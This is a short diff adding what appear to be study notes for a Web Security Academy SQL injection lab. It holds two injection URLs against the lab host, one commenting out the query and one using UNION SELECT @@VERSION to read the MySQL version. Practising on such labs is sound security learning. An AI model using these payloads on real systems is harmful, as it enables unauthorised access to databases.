@@ -1,0 +1,4 @@
+https://ac5c1fee1f0acf4180822d810084006a.web-security-academy.net/filter?category=Gifts%27%20--+
+// Needs space after -- to comment -> MySQL database
+
+https://ac5c1fee1f0acf4180822d810084006a.web-security-academy.net/filter?category=Gifts' UNION SELECT @@VERSION, NULL-- 
